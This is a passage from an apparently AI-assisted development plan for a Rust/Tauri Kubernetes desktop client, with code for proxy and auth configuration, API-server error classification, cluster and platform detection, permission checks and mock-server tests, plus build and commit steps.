        ProxyConfig::System => system_proxy(&host, env),
        ProxyConfig::None => None,
        ProxyConfig::Url { url } => Some(url.trim().to_string()),
    };
    c.proxy_url = proxy
        .map(|u| {
            u.parse::<http::Uri>().map_err(|_| {
                app_err!(
                    ErrorCode::InvalidInput,
                    "errors.connections.badProxyUrl",
                    "Invalid proxy address “{{url}}”: use http://host:port",
                    url = u
                )
            })
        })
        .transpose()?;
    c.auth_info = match &p.auth {
        AuthConfig::Token | AuthConfig::Browser => AuthInfo {
            token: Some(SecretString::from(token(p, secrets)?)),
            ..Default::default()
        },
        AuthConfig::ClientCert { certificate_pem } => {
            let key = secrets
                .get(&secret_key(&p.id, CLIENT_KEY))?
                .filter(|k| !k.trim().is_empty())
                .ok_or_else(|| {
                    app_err!(
                        ErrorCode::AuthFailed,
                        "errors.connections.clientKeyMissing",
                        "No client key is saved for this connection — add the key (PEM)"
                    )
                })?;
            AuthInfo {
                client_certificate_data: Some(STANDARD.encode(certificate_pem.as_bytes())),
                client_key_data: Some(SecretString::from(STANDARD.encode(key.as_bytes()))),
                ..Default::default()
            }
        }
    };
    c.headers.push((
        http::header::USER_AGENT,
        http::HeaderValue::from_static(concat!("glafira-kubernetes/", env!("CARGO_PKG_VERSION"))),
    ));
    Ok(c)
}

/// Таймаут одного запроса к API-серверу.
pub fn request_timeout(p: &ConnectionProfile) -> Duration {
    Duration::from_millis(p.request_timeout_ms)
}
````

<!-- block: file t05-src-tauri-src-k8s-errors-rs-impl step=5.2 path=src-tauri/src/k8s/errors.rs part=impl -->
````rust
//! Ошибки API-сервера и сети → `AppError` (спец. §15). Классификация сетевых ошибок — по тексту
//! цепочки `source()`: так её можно применить и к ошибкам `kube`, и к ошибкам HTTP-клиента OAuth.

use std::sync::LazyLock;

use kube::core::Status;
use regex::Regex;

use crate::error::{AppError, ErrorCode};

/// Текст ошибки вместе со всеми причинами: «a: b: c».
pub fn chain_text(e: &dyn std::error::Error) -> String {
    let mut out = e.to_string();
    let mut cur = e.source();
    while let Some(s) = cur {
        let t = s.to_string();
        if !out.contains(&t) {
            out.push_str(": ");
            out.push_str(&t);
        }
        cur = s.source();
    }
    out
}

pub fn from_kube(e: &kube::Error) -> AppError {
    match e {
        kube::Error::Api(status) => from_status(status),
        kube::Error::Auth(_) => app_err!(
            ErrorCode::AuthFailed,
            "errors.k8s.credentials",
            "The credentials of this connection cannot be used: {{message}}",
            message = chain_text(e)
        ),
        kube::Error::SerdeError(_) => app_err!(
            ErrorCode::Internal,
            "errors.k8s.unexpectedResponse",
            "Unexpected response — is this the address of a Kubernetes API server?"
        )
        .with_details(chain_text(e)),
        _ => from_transport_text(&chain_text(e)),
    }
}

static FORBIDDEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"cannot (?P<verb>[a-z]+) resource "(?P<resource>[^"]+)"(?: in API group "[^"]*")?(?: in the namespace "(?P<ns>[^"]+)")?"#,
    )
    .expect("valid regex")
});

/// 403: какого права не хватает — из текста ответа API-сервера.
pub fn forbidden(message: &str) -> AppError {
    let e = match FORBIDDEN.captures(message) {
        Some(c) => {
            let verb = &c["verb"];
            let resource = &c["resource"];
            match c.name("ns") {
                Some(ns) => app_err!(
                    ErrorCode::Forbidden,
                    "errors.k8s.forbiddenIn",
                    "Not allowed: {{verb}} {{resource}} in project “{{namespace}}”",
                    verb = verb,
                    resource = resource,
                    namespace = ns.as_str()
                ),
                None => app_err!(
                    ErrorCode::Forbidden,
                    "errors.k8s.forbiddenCluster",
                    "Not allowed: {{verb}} {{resource}} at the cluster level",
                    verb = verb,
                    resource = resource
                ),
            }
        }
        None => app_err!(
            ErrorCode::Forbidden,
            "errors.k8s.forbidden",
            "Not allowed: {{message}}",
            message = message
        ),
    };
    e.with_details(message)
}

pub fn from_status(s: &Status) -> AppError {
    let e = match s.code {
        401 => app_err!(
            ErrorCode::SessionExpired,
            "errors.k8s.unauthorized",
            "The cluster rejected the credentials: the token has expired or is invalid"
        ),
        403 => return forbidden(&s.message),
        404 => app_err!(
            ErrorCode::NotFound,
            "errors.k8s.notFound",
            "Not found: {{message}}",
            message = s.message
        ),
        409 => app_err!(
            ErrorCode::Conflict,
            "errors.k8s.conflict",
            "The object has been changed by someone else: {{message}}",
            message = s.message
        ),
        400 | 422 => app_err!(
            ErrorCode::InvalidInput,
            "errors.k8s.invalid",
            "The cluster rejected the request: {{message}}",
            message = s.message
        ),
        429 => app_err!(
            ErrorCode::Timeout,
            "errors.k8s.tooManyRequests",
            "The API server is overloaded — try again later"
        ),
        500..=599 => app_err!(
            ErrorCode::ConnectionFailed,
            "errors.k8s.serverError",
            "The API server returned error {{code}}: {{message}}",
            code = s.code,
            message = s.message
        ),
        _ => app_err!(
            ErrorCode::Internal,
            "errors.k8s.apiError",
            "API server error {{code}}: {{message}}",
            code = s.code,
            message = s.message
        ),
    };
    e.with_details(format!("{} {}: {}", s.code, s.reason, s.message))
}

/// Сетевая ошибка по тексту цепочки причин (hyper, rustls, DNS).
pub fn from_transport_text(text: &str) -> AppError {
    let t = text.to_lowercase();
    let e = if t.contains("invalid peer certificate") || t.contains("certificate") {
        if t.contains("notvalidforname") || t.contains("not valid for name") {
            app_err!(
                ErrorCode::TlsError,
                "errors.k8s.hostnameMismatch",
                "The server certificate does not match its address — check the address or “TLS server name”"
            )
        } else if t.contains("expired") || t.contains("notvalidyet") {
            app_err!(
                ErrorCode::TlsError,
                "errors.k8s.certExpired",
                "The server certificate has expired or is not valid yet"
            )
        } else if t.contains("unknownissuer")
            || t.contains("not trusted")
            || t.contains("untrusted")
        {
            app_err!(
                ErrorCode::TlsError,
                "errors.k8s.caUntrusted",
                "The server certificate is not signed by a trusted CA — specify the cluster CA"
            )
        } else {
            app_err!(
                ErrorCode::TlsError,
                "errors.k8s.tlsError",
                "TLS connection error"
            )
        }
    } else if t.contains("tls") || t.contains("handshake") {
        app_err!(
            ErrorCode::TlsError,
            "errors.k8s.tlsError",
            "TLS connection error"
        )
    } else if t.contains("dns error") || t.contains("failed to lookup address") {
        app_err!(
            ErrorCode::ConnectionFailed,
            "errors.k8s.dns",
            "Cannot resolve the server host name"
        )
    } else if t.contains("timed out") || t.contains("elapsed") || t.contains("timeout") {
        app_err!(
            ErrorCode::Timeout,
            "errors.k8s.timeout",
            "The server did not respond in time"
        )
    } else if t.contains("connect") || t.contains("refused") || t.contains("reset") {
        app_err!(
            ErrorCode::ConnectionFailed,
            "errors.k8s.connect",
            "Cannot connect to the server"
        )
    } else {
        app_err!(
            ErrorCode::Internal,
            "errors.k8s.transport",
            "Network error: {{message}}",
            message = text
        )
    };
    e.with_details(text)
}

/// Ошибка, если операция не уложилась в таймаут запроса.
pub fn timeout() -> AppError {
    app_err!(
        ErrorCode::Timeout,
        "errors.k8s.timeout",
        "The server did not respond in time"
    )
}
````

<!-- block: file t05-src-tauri-src-k8s-mod-rs step=5.2 path=src-tauri/src/k8s/mod.rs -->
````rust
//! Работа с API-сервером: сборка клиента из профиля, ошибки, подключение и проверка.

pub mod config;
pub mod errors;
````

<!-- block: patch t05-src step=5.2 -->
````diff
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -30,6 +30,13 @@ pem = "3"
 url = "2"
 uuid = { version = "1", features = ["v4"] }
 time = { version = "0.3", features = ["formatting"] }
+kube = { version = "4.2", default-features = false, features = ["client", "rustls-tls", "ring", "http-proxy"] }
+k8s-openapi = { version = "0.28", features = ["v1_32"] }
+http = "1"
+secrecy = "0.10"
+base64 = "0.22"
+regex = "1"
+tokio = { version = "1", features = ["rt", "macros", "time", "net", "io-util", "sync"] }
 sys-locale = "0.3"
 
 [target.'cfg(windows)'.dependencies]
@@ -37,6 +44,9 @@ winreg = "0.55"
 
 [dev-dependencies]
 tempfile = "3"
+tokio = { version = "1", features = ["rt-multi-thread", "macros", "time", "test-util"] }
+tower-test = "0.4"
+http-body-util = "0.1"
 
 [profile.release]
 codegen-units = 1
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -3,6 +3,7 @@ pub mod i18n;
 pub mod commands;
 mod dock_name;
 pub mod error;
+pub mod k8s;
 pub mod logging;
 pub mod policy;
 pub mod product;
````

Применить: `python3 /tmp/o1a-blocks.py step 5.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 108 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(k8s): клиент kube из профиля, классификация ошибок API-сервера и сети" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 6: Подключение: пользователь, платформа и группы API, права, пул клиентов

**Files:**
- Create: `src-tauri/src/k8s/cluster.rs`, `src-tauri/src/k8s/pool.rs`, `src-tauri/src/k8s/testing.rs`, `src-tauri/src/platform/mod.rs`
- Modify: `src-tauri/src/commands/folders.rs`, `src-tauri/src/k8s/mod.rs`, `src-tauri/src/lib.rs`, `src-tauri/src/state.rs`

**Interfaces:**
- Consumes: задача 5.
- Produces: `platform::{PlatformKind::{Openshift, Kubernetes}, Distribution::{Eks, Gke, Aks, Rancher, Deckhouse, K3s, Rke2}, Distribution::title, Discovery { group_versions, git_version, cluster_version, node_labels }, Discovery::has_group, ApiGroups { routes, projects, deployment_configs, gateway_api }, ApiGroups::of, PlatformInfo { kind, distribution, version, label }, detect}`; `k8s::cluster::{Capabilities { list_projects, list_nodes, list_all_pods, read_cluster_operators, read_cluster_version }, ConnectionInfo { user, groups, server_version, platform, api_groups, capabilities }, Discovered { server_version, platform, api_groups }, timed, whoami, discover, can_i, capabilities(client, limit, &Discovered), probe}`, в тестах — `fixtures::openshift`; `k8s::testing::{Seen { method, uri, body }, Seen::path, mock_client(handler) -> (kube::Client, JoinHandle<Vec<Seen>>), status(code, reason, message)}`; `k8s::pool::{Connected { client, info, timeout }, ClientPool::{get, generation, insert_if_current, evict}, open(ConnectionProfile, Arc<dyn SecretStore>)}`; `AppState::{pool, connected(id, fresh) -> AppResult<Arc<Connected>>, evict_if_broken, evict_connection, delete_connection_full}`.

Спец. §4.3, §5.3–5.4. Слой платформы `platform/` — чистая функция `detect(&Discovery) -> PlatformInfo`: группа `config.openshift.io` — `openshift` («OpenShift 4.18» или «OKD 4.15» по версии ClusterVersion, без прав на него — просто «OpenShift»), иначе `kubernetes` с дистрибутивом по `/version`, группам и меткам ноды (EKS, GKE, AKS, Rancher, Deckhouse, k3s, RKE2); признак DropApp добавляет этап O5. Отдельно от платформы — `ApiGroups`: какие объекты показывать (Route, проекты, DeploymentConfig, Gateway API `v1`), правило одно для всех платформ. Трейт `Platform` с адаптерами появится в O1b вместе с первым поведением, которое от платформы зависит (обзор кластера). `probe` — `SelfSubjectReview` («кто я»), discovery (`/version`, `/apis`, у OpenShift — ClusterVersion `version`, у неузнанного Kubernetes — одна нода для AKS), затем параллельные `SelfSubjectAccessReview` на проекты (или namespace), ноды, поды во всех проектах, а у OpenShift — ClusterOperators и ClusterVersion; ошибка проверки права означает «нет права». `k8s/testing.rs` — мок API-сервера на `tower-test`. Пул хранит один клиент на подключение; поколение растёт при сбросе, поэтому клиент, подключавшийся дольше, чем жил профиль, в пул не попадает. Импорт подключений сбрасывает клиенты обновлённых.

- [ ] **Step 1: Тесты.**

<!-- block: file t06-src-tauri-src-k8s-cluster-rs-tests step=6.1 path=src-tauri/src/k8s/cluster.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ErrorCode;
    use crate::k8s::testing::{mock_client, status};

    const LIMIT: Duration = Duration::from_secs(5);

    #[tokio::test]
    async fn probe_collects_user_version_and_rights() {
        let (client, server) = mock_client(fixtures::openshift);
        let info = probe(&client, LIMIT).await.unwrap();
        assert_eq!(
            info,
            ConnectionInfo {
                user: "dev1".into(),
                groups: vec!["system:authenticated".into(), "team-a".into()],
                server_version: "v1.32.5".into(),
                platform: PlatformInfo {
                    kind: PlatformKind::Openshift,
                    distribution: None,
                    version: None,
                    label: "OpenShift".into(),
                },
                api_groups: ApiGroups {
                    routes: true,
                    projects: true,
                    deployment_configs: true,
                    gateway_api: false,
                },
                capabilities: Capabilities {
                    list_projects: true,
                    list_nodes: false,
                    list_all_pods: true,
                    read_cluster_operators: false,
                    read_cluster_version: false,
                },
            }
        );
        drop(client);
        let seen = server.await.unwrap();
        assert!(
            seen.iter()
                .filter(|s| s.path().ends_with("reviews"))
                .all(|s| s.method == http::Method::POST)
        );
        let reviews: Vec<_> = seen
            .iter()
            .filter(|s| s.path().ends_with("selfsubjectaccessreviews"))
            .map(|s| {
                s.body["spec"]["resourceAttributes"]["resource"]
                    .as_str()
                    .unwrap()
                    .to_string()
            })
            .collect();
        assert_eq!(reviews.len(), 5, "{reviews:?}");
        for r in [
            "projects",
            "nodes",
            "pods",
            "clusteroperators",
            "clusterversions",
        ] {
            assert!(reviews.iter().any(|x| x == r), "{r}");
        }
        assert!(
            !seen.iter().any(|s| s.path() == "/api/v1/nodes"),
            "у OpenShift ноды для определения дистрибутива не читаются"
        );
    }

    #[tokio::test]
    async fn openshift_version_comes_from_cluster_version() {
        let (client, _server) = mock_client(|s| match s.path() {
            "/apis/config.openshift.io/v1/clusterversions/version" => (
                200,
                serde_json::json!({"apiVersion": "config.openshift.io/v1", "kind": "ClusterVersion",
                    "metadata": {"name": "version"}, "status": {"desired": {"version": "4.18.3"}}}),
            ),
            _ => fixtures::openshift(s),
        });
        let d = discover(&client, LIMIT).await.unwrap();
        assert_eq!(d.platform.label, "OpenShift 4.18");
        assert_eq!(d.server_version, "v1.32.5");
    }

    #[tokio::test]
    async fn kubernetes_without_openshift_groups() {
        let (client, server) = mock_client(|s| match s.path() {
            "/apis" => (
                200,
                serde_json::json!({"kind": "APIGroupList", "apiVersion": "v1", "groups": [
                    {"name": "apps", "versions": [{"groupVersion": "apps/v1", "version": "v1"}]},
                    {"name": "route.openshift.io", "versions": [{"groupVersion": "route.openshift.io/v1", "version": "v1"}]},
                    {"name": "gateway.networking.k8s.io", "versions": [{"groupVersion": "gateway.networking.k8s.io/v1", "version": "v1"}]}
                ]}),
            ),
            "/api/v1/nodes" => (
                200,
                serde_json::json!({"apiVersion": "v1", "kind": "NodeList", "metadata": {},
                    "items": [{"metadata": {"name": "aks-1",
                        "labels": {"kubernetes.azure.com/cluster": "rg", "kubernetes.io/os": "linux"}}}]}),
            ),
            _ => fixtures::openshift(s),
        });
        let info = probe(&client, LIMIT).await.unwrap();
        assert_eq!(info.platform.kind, PlatformKind::Kubernetes);
        assert_eq!(info.platform.label, "Kubernetes 1.32 (AKS)");
        assert_eq!(
            info.api_groups,
            ApiGroups {
                routes: true,
                gateway_api: true,
                ..Default::default()
            },
            "CRD Route без config.openshift.io — это Kubernetes с Route"
        );
        drop(client);
        let seen = server.await.unwrap();
        assert!(
            seen.iter()
                .any(|s| s.uri.starts_with("/api/v1/nodes?") && s.uri.contains("limit=1"))
        );
        let resources: Vec<_> = seen
            .iter()
            .filter_map(|s| s.body["spec"]["resourceAttributes"]["resource"].as_str())
            .collect();
        assert!(resources.contains(&"namespaces"));
        assert!(
            !resources.contains(&"clusteroperators"),
            "без OpenShift не спрашиваем"
        );
    }

    #[tokio::test]
    async fn expired_token_stops_the_probe() {
        let (client, _server) = mock_client(|_| status(401, "Unauthorized", "Unauthorized"));
        let e = probe(&client, LIMIT).await.unwrap_err();
        assert_eq!(e.code, ErrorCode::SessionExpired);
    }

    #[tokio::test]
    async fn failed_access_review_means_no_right() {
        let (client, _server) = mock_client(|s| match s.path() {
            "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" => {
                status(500, "InternalError", "etcd timeout")
            }
            _ => fixtures::openshift(s),
        });
        let info = probe(&client, LIMIT).await.unwrap();
        assert_eq!(info.capabilities, Capabilities::default());
    }

    #[tokio::test(start_paused = true)]
    async fn slow_server_times_out() {
        let fut = async {
            tokio::time::sleep(Duration::from_secs(60)).await;
            Ok::<_, kube::Error>(())
        };
        let e = timed(Duration::from_secs(1), fut).await.unwrap_err();
        assert_eq!(e.code, ErrorCode::Timeout);
    }
}
````

<!-- block: file t06-src-tauri-src-k8s-pool-rs-tests step=6.1 path=src-tauri/src/k8s/pool.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::k8s::cluster::Capabilities;

    fn connected() -> Arc<Connected> {
        let (client, _) = crate::k8s::testing::mock_client(|_| (200, serde_json::json!({})));
        Arc::new(Connected {
            client,
            info: ConnectionInfo {
                user: "u".into(),
                groups: vec![],
                server_version: "v1.32.0".into(),
                platform: crate::platform::detect(&Default::default()),
                api_groups: Default::default(),
                capabilities: Capabilities::default(),
            },
            timeout: Duration::from_secs(1),
        })
    }

    #[tokio::test]
    async fn eviction_bumps_generation_and_blocks_stale_insert() {
        let pool = ClientPool::default();
        let g = pool.generation("a");
        assert!(pool.insert_if_current("a", g, connected()));
        assert!(pool.get("a").is_some());
        let stale = pool.generation("a");
        assert!(pool.evict("a"));
        assert!(pool.get("a").is_none());
        assert!(
            !pool.insert_if_current("a", stale, connected()),
            "профиль сменился во время подключения"
        );
        assert!(!pool.evict("a"), "клиента уже нет");
        assert!(pool.insert_if_current("a", pool.generation("a"), connected()));
    }

    #[tokio::test]
    async fn open_reports_missing_token_without_network() {
        let p = crate::storage::profile::sample_profile("a");
        let e = open(p, Arc::new(crate::secrets::MemoryStore::default()))
            .await
            .err()
            .unwrap();
        assert_eq!(e.key, "errors.connections.tokenMissing");
    }
}
````

<!-- block: file t06-src-tauri-src-platform-mod-rs-tests step=6.1 path=src-tauri/src/platform/mod.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    const KUBE: &[&str] = &[
        "apps/v1",
        "batch/v1",
        "networking.k8s.io/v1",
        "authentication.k8s.io/v1",
        "authorization.k8s.io/v1",
    ];
    const OPENSHIFT: &[&str] = &[
        "config.openshift.io/v1",
        "route.openshift.io/v1",
        "project.openshift.io/v1",
        "apps.openshift.io/v1",
        "oauth.openshift.io/v1",
    ];

    fn snapshot(extra: &[&str], git_version: &str) -> Discovery {
        Discovery {
            group_versions: KUBE.iter().chain(extra).map(|s| s.to_string()).collect(),
            git_version: git_version.into(),
            ..Default::default()
        }
    }

    /// Снимки discovery и `/version` (спец. §17): платформа, дистрибутив, название.
    #[test]
    fn detect_table() {
        let mut ocp = snapshot(OPENSHIFT, "v1.31.6");
        ocp.cluster_version = Some("4.18.3".into());
        let mut okd = snapshot(OPENSHIFT, "v1.28.7+6e2789b");
        okd.cluster_version = Some("4.15.0-0.okd-2024-03-10-010116".into());
        let ocp_no_cv = snapshot(OPENSHIFT, "v1.31.6");
        let mut aks = snapshot(&[], "v1.30.5");
        aks.node_labels = vec![
            "kubernetes.azure.com/cluster".into(),
            "kubernetes.io/os".into(),
        ];
        let cases: Vec<(&str, Discovery, PlatformKind, Option<Distribution>, &str)> = vec![
            ("OCP", ocp, PlatformKind::Openshift, None, "OpenShift 4.18"),
            ("OKD", okd, PlatformKind::Openshift, None, "OKD 4.15"),
            (
                "OCP без прав на ClusterVersion",
                ocp_no_cv,
                PlatformKind::Openshift,
                None,
                "OpenShift",
            ),
            (
                "Kubernetes",
                snapshot(&[], "v1.31.4"),
                PlatformKind::Kubernetes,
                None,
                "Kubernetes 1.31",
            ),
            (
                "Kubernetes с CRD Route",
                snapshot(&["route.openshift.io/v1"], "v1.31.4"),
                PlatformKind::Kubernetes,
                None,
                "Kubernetes 1.31",
            ),
            (
                "Gateway API",
                snapshot(
                    &[
                        "gateway.networking.k8s.io/v1",
                        "gateway.networking.k8s.io/v1beta1",
                    ],
                    "v1.32.1",
                ),
                PlatformKind::Kubernetes,
                None,
                "Kubernetes 1.32",
            ),
            (
                "EKS",
                snapshot(&[], "v1.30.4-eks-a737599"),
                PlatformKind::Kubernetes,
                Some(Distribution::Eks),
                "Kubernetes 1.30 (EKS)",
            ),
            (
                "GKE",
                snapshot(&[], "v1.31.1-gke.1678000"),
                PlatformKind::Kubernetes,
                Some(Distribution::Gke),
                "Kubernetes 1.31 (GKE)",
            ),
            (
                "AKS",
                aks,
                PlatformKind::Kubernetes,
                Some(Distribution::Aks),
                "Kubernetes 1.30 (AKS)",
            ),
            (
                "Rancher",
                snapshot(
                    &["management.cattle.io/v3", "catalog.cattle.io/v1"],
                    "v1.30.6+k3s1",
                ),
                PlatformKind::Kubernetes,
                Some(Distribution::Rancher),
                "Kubernetes 1.30 (Rancher)",
            ),
            (
                "Deckhouse",
                snapshot(&["deckhouse.io/v1alpha1"], "v1.30.8"),
                PlatformKind::Kubernetes,
                Some(Distribution::Deckhouse),
                "Kubernetes 1.30 (Deckhouse)",
            ),
            (
                "k3s",
                snapshot(&[], "v1.31.2+k3s1"),
                PlatformKind::Kubernetes,
                Some(Distribution::K3s),
                "Kubernetes 1.31 (k3s)",
            ),
            (
                "RKE2",
                snapshot(&[], "v1.31.2+rke2r1"),
                PlatformKind::Kubernetes,
                Some(Distribution::Rke2),
                "Kubernetes 1.31 (RKE2)",
            ),
        ];
        for (name, d, kind, dist, label) in cases {
            let p = detect(&d);
            assert_eq!(
                (p.kind, p.distribution, p.label.as_str()),
                (kind, dist, label),
                "{name}"
            );
        }
    }

    #[test]
    fn api_groups_decide_objects_not_platform() {
        let routes_only = snapshot(&["route.openshift.io/v1"], "v1.31.4");
        assert_eq!(
            ApiGroups::of(&routes_only),
            ApiGroups {
                routes: true,
                ..Default::default()
            }
        );
        assert_eq!(
            ApiGroups::of(&snapshot(OPENSHIFT, "v1.31.6")),
            ApiGroups {
                routes: true,
                projects: true,
                deployment_configs: true,
                gateway_api: false,
            }
        );
        let beta_only = snapshot(&["gateway.networking.k8s.io/v1beta1"], "v1.29.0");
        assert!(!ApiGroups::of(&beta_only).gateway_api, "нужна версия v1");
    }

    #[test]
    fn versions_and_json() {
        assert_eq!(major_minor("v1.31.4-eks-a737599").as_deref(), Some("1.31"));
        assert_eq!(major_minor("4.18.3").as_deref(), Some("4.18"));
        assert_eq!(major_minor("v1.29+").as_deref(), Some("1.29"));
        assert_eq!(major_minor(""), None);
        assert_eq!(major_minor("garbage"), None);
        let p = detect(&snapshot(&[], "v1.30.4-eks-a737599"));
        assert_eq!(
            serde_json::to_value(&p).unwrap(),
            serde_json::json!({"kind": "kubernetes", "distribution": "eks", "version": "1.30",
                "label": "Kubernetes 1.30 (EKS)"})
        );
        let p = detect(&snapshot(&["config.openshift.io/v1"], "garbage"));
        assert_eq!(
            serde_json::to_value(&p).unwrap(),
            serde_json::json!({"kind": "openshift", "distribution": null, "version": null,
                "label": "OpenShift"})
        );
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 6.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t06-src-tauri-src-k8s-cluster-rs-impl step=6.2 path=src-tauri/src/k8s/cluster.rs part=impl -->
````rust
//! Что Glafira узнаёт при подключении: кто пользователь, платформа и группы API, версия и права
//! (спец. §4.3, §5.3–5.4). Только чтение; каждый запрос ограничен таймаутом профиля.

use std::future::Future;
use std::time::Duration;

use k8s_openapi::api::authentication::v1::SelfSubjectReview;
use k8s_openapi::api::authorization::v1::{
    ResourceAttributes, SelfSubjectAccessReview, SelfSubjectAccessReviewSpec,
};
use k8s_openapi::api::core::v1::Node;
use kube::api::{Api, ApiResource, DynamicObject, GroupVersionKind, ListParams, PostParams};
use serde::Serialize;

use crate::error::AppResult;
use crate::k8s::errors::{from_kube, timeout};
use crate::platform::{ApiGroups, Discovery, PlatformInfo, PlatformKind, detect};

/// Что пользователь может читать на уровне кластера. Без права соответствующие узлы и вкладки
/// не показываются.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Capabilities {
    /// Список проектов (`project.openshift.io`) или namespace.
    pub list_projects: bool,
    pub list_nodes: bool,
    pub list_all_pods: bool,
    pub read_cluster_operators: bool,
    pub read_cluster_version: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ConnectionInfo {
    pub user: String,
    pub groups: Vec<String>,
    /// `gitVersion` API-сервера, например `v1.32.5`.
    pub server_version: String,
    pub platform: PlatformInfo,
    pub api_groups: ApiGroups,
    pub capabilities: Capabilities,
}

/// Итог discovery: версия API-сервера, платформа и группы API.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Discovered {
    pub server_version: String,
    pub platform: PlatformInfo,
    pub api_groups: ApiGroups,
}

/// Операция с таймаутом запроса; ошибки `kube` переводятся в `AppError`.
pub async fn timed<T>(limit: Duration, fut: impl Future<Output = kube::Result<T>>) -> AppResult<T> {
    match tokio::time::timeout(limit, fut).await {
        Ok(r) => r.map_err(|e| from_kube(&e)),
        Err(_) => Err(timeout()),
    }
}

/// Имя и группы текущего пользователя (`SelfSubjectReview`, Kubernetes 1.28+).
pub async fn whoami(client: &kube::Client, limit: Duration) -> AppResult<(String, Vec<String>)> {
    let api: Api<SelfSubjectReview> = Api::all(client.clone());
    let r = timed(
        limit,
        api.create(&PostParams::default(), &SelfSubjectReview::default()),
    )
    .await?;
    let info = r.status.and_then(|s| s.user_info).unwrap_or_default();
    Ok((
        info.username.unwrap_or_default(),
        info.groups.unwrap_or_default(),
    ))
}

/// Версия OpenShift из ClusterVersion `version`; нет прав или объекта — `None`.
async fn cluster_version(client: &kube::Client, limit: Duration) -> Option<String> {
    let ar = ApiResource::from_gvk_with_plural(
        &GroupVersionKind::gvk("config.openshift.io", "v1", "ClusterVersion"),
        "clusterversions",
    );
    let api: Api<DynamicObject> = Api::all_with(client.clone(), &ar);
    match timed(limit, api.get("version")).await {
        Ok(cv) => cv.data["status"]["desired"]["version"]
            .as_str()
            .map(String::from),
        Err(e) => {
            tracing::debug!("cluster version is not readable: {}", e.message);
            None
        }
    }
}

/// Имена меток первой ноды (по ним узнаётся AKS); нет прав — пусто.
async fn first_node_labels(client: &kube::Client, limit: Duration) -> Vec<String> {
    let api: Api<Node> = Api::all(client.clone());
    match timed(limit, api.list(&ListParams::default().limit(1))).await {
        Ok(list) => list
            .items
            .into_iter()
            .next()
            .and_then(|n| n.metadata.labels)
            .map(|labels| labels.into_keys().collect())
            .unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

/// Версия API-сервера, группы API и платформа (спец. §4.3). ClusterVersion читается только
/// у OpenShift, ноды — только если дистрибутив не узнан по версии и группам.
pub async fn discover(client: &kube::Client, limit: Duration) -> AppResult<Discovered> {
    let version = timed(limit, client.apiserver_version()).await?;
    let groups = timed(limit, client.list_api_groups()).await?;
    let mut d = Discovery {
        group_versions: groups
            .groups
            .iter()
            .flat_map(|g| g.versions.iter().map(|v| v.group_version.clone()))
            .collect(),
        git_version: version.git_version,
        ..Default::default()
    };
    if d.has_group("config.openshift.io") {
        d.cluster_version = cluster_version(client, limit).await;
    }
    let mut platform = detect(&d);
    if platform.kind == PlatformKind::Kubernetes && platform.distribution.is_none() {
        d.node_labels = first_node_labels(client, limit).await;
        platform = detect(&d);
    }
    Ok(Discovered {
        api_groups: ApiGroups::of(&d),
        server_version: d.git_version,
        platform,
    })
}

/// Разрешено ли действие (`SelfSubjectAccessReview`). Ошибка самой проверки — «нет».
pub async fn can_i(
    client: &kube::Client,
    limit: Duration,
    verb: &str,
    group: &str,
    resource: &str,
    namespace: Option<&str>,
) -> bool {
    let api: Api<SelfSubjectAccessReview> = Api::all(client.clone());
    let review = SelfSubjectAccessReview {
        spec: SelfSubjectAccessReviewSpec {
            resource_attributes: Some(ResourceAttributes {
                verb: Some(verb.into()),
                group: Some(group.into()),
                resource: Some(resource.into()),
                namespace: namespace.map(String::from),
                ..Default::default()
            }),
            ..Default::default()
        },
        ..Default::default()
    };
    match timed(limit, api.create(&PostParams::default(), &review)).await {
        Ok(r) => r.status.is_some_and(|s| s.allowed),
        Err(e) => {
            tracing::warn!(verb, resource, "access review failed: {}", e.message);
            false
        }
    }
}

/// Права уровня кластера; проверки идут параллельно. ClusterOperators и ClusterVersion
/// спрашиваются только у OpenShift.
pub async fn capabilities(client: &kube::Client, limit: Duration, d: &Discovered) -> Capabilities {
    let open_shift = d.platform.kind == PlatformKind::Openshift;
    let projects = async {
        if d.api_groups.projects {
            can_i(
                client,
                limit,
                "list",
                "project.openshift.io",
                "projects",
                None,
            )
            .await
        } else {
            can_i(client, limit, "list", "", "namespaces", None).await
        }
    };
    let operators = async {
        open_shift
            && can_i(
                client,
                limit,
                "list",
                "config.openshift.io",
                "clusteroperators",
                None,
            )
            .await
    };
    let version = async {
        open_shift
            && can_i(
                client,
                limit,
                "get",
                "config.openshift.io",
                "clusterversions",
                None,
            )
            .await
    };
    let (list_projects, list_nodes, list_all_pods, read_cluster_operators, read_cluster_version) = tokio::join!(
        projects,
        can_i(client, limit, "list", "", "nodes", None),
        can_i(client, limit, "list", "", "pods", None),
        operators,
        version,
    );
    Capabilities {
        list_projects,
        list_nodes,
        list_all_pods,
        read_cluster_operators,
        read_cluster_version,
    }
}

/// Всё, что Glafira узнаёт при подключении. Первая ошибка («кто я», discovery) прерывает
/// подключение; ошибки проверок прав дают «нет права».
pub async fn probe(client: &kube::Client, limit: Duration) -> AppResult<ConnectionInfo> {
    let (user, groups) = whoami(client, limit).await?;
    let d = discover(client, limit).await?;
    let capabilities = capabilities(client, limit, &d).await;
    Ok(ConnectionInfo {
